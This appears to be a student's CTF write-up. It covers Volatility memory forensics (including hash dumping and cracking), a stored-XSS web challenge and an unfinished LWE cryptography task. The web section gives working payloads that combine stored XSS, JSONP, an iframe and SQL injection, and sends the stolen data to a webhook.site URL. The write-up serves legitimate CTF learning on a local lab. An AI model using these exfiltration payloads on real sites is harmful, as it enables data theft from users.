# Forensic

Gotham

When I first received the challenge, the only artifact provided was a memory dump. Before touching tools, I checked the file size and format to understand what I was working with. It appeared to contain complete system memory, so the goal was clear — enumerate processes, locate artifacts, extract data, and assemble flags.

## Volatility2

Volatility is the standard toolkit for memory analysis ,  Volatility2 more suited for deep forensic extraction here.

To proceed, I installed the required Volatility2 dependencies:
```
pip2 install pycryptodome
pip2 install distorm3
pip2 install yara-python
```

Then I loaded the memory file using Volatility2:

```
python2 vol.py -f gotham.raw imageinfo
```

Step 1 – Extracting Terminal History

Command history often reveals flags or hints. So I ran:
```
python2 vol.py -f gotham.raw --profile=Win7SP1x64 cmdscan
```

Among the recovered commands were:

whoami
dir
bi0s
dfirlabs
Ymkwc2N0Znt3M2xjMG0zXw==
azr43ln1ght.github.io
Azr43lKn1ght
did you find flag1?


That Base64-looking string was suspicious:
```
echo "Ymkwc2N0Znt3M2xjMG0zXw==" | base64 -d
```

→ Output revealed FLAG 1

Step 2 – Process Dumping for More Flags

Next, I listed running processes using pstree/plist and identified notepad.exe (PID 2592) as a good target to dump:
```
strings -el 2592.dmp | grep -i flag
```

Two Base64 values popped up:

flag3 = aDBwM190aDE1Xw==
flag4 = YjNuM2YxNzVfeTB1Xw==


Decoded:
```
echo "YjNuM2YxNzVfeTB1Xw==" | base64 -d 
→ b3n3f175_y0u
```
```
echo "aDBwM190aDE1Xw==" | base64 -d
→ h0p3_th15_
```

So now we had FLAG 3 & FLAG 4.

Step 3 – The RAR Archive (Flag 5)

Volatility's filescan revealed a RAR file:
```
filescan | grep flag5
```

Dumped the offset → extracted as:
```
mv file.None.0xfffffa80049f86a0.dat flag5.rar
unrar x flag5.rar
```

The file requested a password — likely the system password. Using hashdump:
```
python2 vol.py -f gotham.raw --profile=Win7SP1x64 hashdump
```

One of the password hashes belonged to user bruce. Cracked using hashcat and the correct password unlocked flag.txt, which contained:
```
bTByM18xMzMzNzQzMX0=
echo "bTByM18xMzMzNzQzMX0=" | base64 -d
→ m0r3_13337431}
```

This gave FLAG 5 (final part).

Flag 2

The remaining part was likely embedded in a paint/MS-Paint memory segment. After dumping, the recovered BMP was too blurred and unreadable but after some time and some tools the flag was t0_df1r_l4b5.

Final Reconstructed Flag
```
bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}
```

# Web Exploitation

i accessed the ViteLibrary web application at localhost:50001
Found a library management system where users can add books with title, author, and page count
Noticed a share feature at ```/liteShare/:user/:liteId```
Tested login functionality with admin:admin credentials - successfully logged in

Examined scripts.js and found vulnerable code:
```
javascriptlibraryRoot.innerHTML += cardTemplate
    .replace("Book Title", book.title)
    .replace("Book Author", book.author);
```
User input directly inserted into innerHTML without sanitization Stored XSS vulnerability identified

Checked main.js and found CSP configuration:

Blocks inline <script> tags
Allows inline event handlers like onerror


Discovered toTitleCase() function processes author field


Found /getBooks endpoint limits results 

Created book using browser console:
```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: 'Test Book',
    author: `<img src=x onerror=alert(1)>`,
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```

Result: Book created but XSS didn't execute toTitleCase() broke the payload

Moved payload to title field to bypass toTitleCase():

```
javascriptfetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: `<img src=x onerror="fetch('/getBooks').then(r=>r.json()).then(b=>fetch('https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6?flag='+encodeURIComponent(JSON.stringify(b))))">`,
    author: 'Test',
    pages: 100,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
});
```
Result: Book created successfully with liteId: hy2iGMCe9a

Opened incognito window
Logged in as admin:admin
```
Visited http://localhost:50001/liteShare/hacker/hy2iGMCe9a
```

Checked webhook.site

Result: Webhook received request at /flag endpoint but no query parameters - data not exfiltrated

then tried new payload with webhook init and iframe 
```
const webhookUrl = 'https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6';

const payload = `<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&jscmd=viewapi&callback=fetch(%27%2Fapi%2Fdelete%3Ftitle%3D%27%2BencodeURIComponent(%27%22%20UNION%20SELECT%20link%20as%20title%20FROM%20BOOKS%20WHERE%20link%20LIKE%20%22%25flag%25%22%20--%27)%2C%7Bmethod%3A%27POST%27%7D).then(r%3D%3Er.json()).then(d%3D%3E%7Bwindow.top.location%3D%27${webhookUrl}%3Fflag%3D%27%2BencodeURIComponent(d.book.title)%7D)'></script>"></iframe>`;

fetch('/api/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    title: payload,
    author: 'FinalExploit',
    pages: 300,
    imageLink: '/assets/icons/bookshelf.svg',
    link: '',
    fav: false,
    read: false
  })
})
.then(r => r.json())
.then(d => {
  if (d.status === 'ok') {
    const shareUrl = `http://localhost:50001/liteShare/hacker/${d.book.liteId}`;
    console.log(shareUrl);
  }
});
```
<img width="1919" height="911" alt="image" src="https://github.com/user-attachments/assets/4f5db92c-a13c-45bc-b0a0-8b2088af3653" />

i then went to incognito logged in as admin and ran the url in browser
```
http://localhost:50001/liteShare/hacker/QpjjOBQ_Hd
```
<img width="1918" height="915" alt="image" src="https://github.com/user-attachments/assets/6b72697f-c06f-490f-a209-b1f40f626774" />

the flag was with webhook

final flag
```
flag=nite{test_flag_stp}
```
# Cryptography

i could not complete it because solving LWE is taking so much of time.

in the problem we had been given 30 nodes , LWE public parameters (A matrix, b vector, q=1009, n=50, m=100), a server file that checks if our hamiltonian path is correct or not, if the path is correct then server will provide us with LWE error magnitudes by which we have to solve the equation and then s value be sent to server which will provide us the flag.

i connected to the server filtermaze.2025.ctfcompetition.com:1337

then solved pow from the given python file 
```
curl -sSL https://goo.gle/kctf-pow | python3 - solve s.AJyu.AAD979QOnEPsWFG/ANyMYWav
```
this pow keep changing for every new run so i made a python script for this
```

def gmpy_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for _ in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)

def python_sloth_root(x, diff, p):
    exponent = (p + 1) // 4
    for _ in range(diff):
        x = pow(x, exponent, p) ^ 1
    return x

def sloth_root(x, diff, p):
    return gmpy_sloth_root(x, diff, p) if HAVE_GMP else python_sloth_root(x, diff, p)

def encode_number(num):
    size = (num.bit_length() // 24) * 3 + 3
    return str(base64.b64encode(num.to_bytes(size, 'big')), 'utf-8')

def decode_number(enc):
    return int.from_bytes(base64.b64decode(bytes(enc, 'utf-8')), 'big')

def decode_challenge(enc):
    parts = enc.split('.')
    if parts[0] != VERSION:
        raise Exception('Unknown challenge version')
    return list(map(decode_number, parts[1:]))

def encode_challenge(arr):
    return '.'.join([VERSION] + list(map(encode_number, arr)))

def solve_pow_challenge(chal: str) -> str:
    diff, x = decode_challenge(chal)
    print(f"[*] PoW difficulty: {diff}")
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])
```
by this i entered into the server and i now manually sent the nodes to check the valid_prefix to automate this i made a python script

```
def discover_path(sock, graph):
    """Discover secret Hamiltonian path using oracle queries"""
    nodes = sorted(graph.keys())
    path = []
    
    # Find start node
    print("[*] Finding start node...")
    for v in nodes:
        send_json(sock, {"command": "check_path", "segment": [v]})
        resp = recv_json_line(sock)
        if resp.get("status") in ["valid_prefix", "path_complete"]:
            path = [v]
            print(f"[+] Start node: {v}")
            if resp.get("status") == "path_complete":
                return path, resp.get("lwe_error_magnitudes")
            break
    
    if not path:
        raise RuntimeError("No start node found")
    
    # Extend path
    print("[*] Extending path...")
    while len(path) < len(graph):
        last = path[-1]
        used = set(path)
        found = False
        
        for neighbor in graph[last]:
            if neighbor in used:
                continue
            
            candidate = path + [neighbor]
            send_json(sock, {"command": "check_path", "segment": candidate})
            resp = recv_json_line(sock)
            status = resp.get("status")
            
            if status == "path_complete":
                print(f"[+] Path complete! Length: {len(candidate)}")
                return candidate, resp.get("lwe_error_magnitudes")
            elif status == "valid_prefix":
                path.append(neighbor)
                print(f"[+] Extended to length {len(path)}")
                found = True
                break
        
        if not found:
            raise RuntimeError(f"Stuck at {path}")
    
    raise RuntimeError("Path not completed")
```

the final path came 
```
[0, 15, 1, 16, 2, 17, 3, 18, 4, 19, 5, 20, 6, 21, 7, 22, 8, 23, 9, 24, 10, 25, 11, 26, 12, 27, 13, 28, 14, 29]
```
i sent this path to the server and it gave me error magnitudes
```
[265, 622, 38, 716, 722, 308, 996, 799, 742, 337, 927, 698, 626, 969, 330, 126, 321, 20, 271, 839, 175, 399, 752, 989, 666, 629, 271, 400, 311, 840, 821, 821, 17, 978, 488, 781, 74, 818, 849, 903, 776, 142, 505, 951, 582, 638, 222, 872, 427, 165, 307, 209, 475, 970, 748, 814, 69, 213, 27, 742, 744, 566, 262, 852, 740, 309, 997, 502, 995, 434, 405, 193, 257, 953, 924, 678, 232, 226, 560, 414, 584, 579, 767, 810, 51, 894, 446, 281, 761, 908, 715, 787, 722, 270, 94, 169, 474, 431, 292, 346]
```
after this i could not do the learn with error. the linear equation was having many solutions. I found a article on google about how to solve this LWE using sparse matrix.
<img width="1908" height="915" alt="image" src="https://github.com/user-attachments/assets/c278ef28-a230-4bf9-bee4-de38817d6c44" />
this was no help so i learnt about Z3-solver python library which could help me as it was taking so much of time i left the challenge here
```
import json
from z3 import Int, Bool, If, Solver, sat

with open("lwe_pub_params.json", "r") as f:
    lwe = json.load(f)

A = lwe["A"]      # 100 x 50
b = lwe["b"]      # 100
q = lwe["lwe_q"]  # 1009

m = len(A)
n = len(A[0])

print(f"A is {m}x{n}, len(b)={len(b)}, q={q}")
error_mags = [
    265, 622, 38, 716, 722, 308, 996, 799, 742, 337,
    927, 698, 626, 969, 330, 126, 321, 20, 271, 839,
    175, 399, 752, 989, 666, 629, 271, 400, 311, 840,
    821, 821, 17, 978, 488, 781, 74, 818, 849, 903,
    776, 142, 505, 951, 582, 638, 222, 872, 427, 165,
    307, 209, 475, 970, 748, 814, 69, 213, 27, 742,
    744, 566, 262, 852, 740, 309, 997, 502, 995, 434,
    405, 193, 257, 953, 924, 678, 232, 226, 560, 414,
    584, 579, 767, 810, 51, 894, 446, 281, 761, 908,
    715, 787, 722, 270, 94, 169, 474, 431, 292, 346
]

assert len(error_mags) == m

s_vars   = [Int(f"s_{j}")   for j in range(n)]  # secret key components
signs    = [Bool(f"sgn_{i}") for i in range(m)] # True => +mag, False => -mag
k_vars   = [Int(f"k_{i}")   for i in range(m)]  # wrap-around multipliers (any integer)

solver = Solver()

# s_j in [0, q-1]
for sj in s_vars:
    solver.add(sj >= 0, sj < q)


#    sum_j A[i][j] * s_j + (± error_mags[i]) - b[i] = q * k_i
for i in range(m):
    row = A[i]
    bi  = b[i]
    mag = error_mags[i]

    dot = sum(row[j] * s_vars[j] for j in range(n))
    e_i = If(signs[i], mag, -mag)     # True -> +mag, False -> -mag

    solver.add(dot + e_i - bi == q * k_vars[i])

print("[*] Calling Z3 solver (this can take a while, but WILL finish)...")
res = solver.check()
print("[*] Z3 result:", res)

if res != sat:
    raise RuntimeError("Z3 says problem is not SAT (or unknown) – something's off.")

model = solver.model()
s_recovered = [model[sj].as_long() for sj in s_vars]

print("\n[+] Recovered secret s (length = {}):".format(len(s_recovered)))
print(s_recovered)

# Optional: small verification
def mod_q(x):
    return x % q

ok = True
for i in range(m):
    row = A[i]
    mag = error_mags[i]
    dot = sum(row[j] * s_recovered[j] for j in range(n))
    ei_signed = model[signs[i]]
    ei = mag if ei_signed is None or ei_signed else -mag
    lhs = mod_q(dot + ei)
    rhs = mod_q(b[i])
    if lhs != rhs:
        ok = False
        print(f"Row {i} mismatch: lhs={lhs}, rhs={rhs}")
        break

print("\nVerification:", "OK" if ok else "FAILED")

print("\nSend this JSON to the server:")
print({"command": "get_flag", "lwe_secret_s": s_recovered})
```
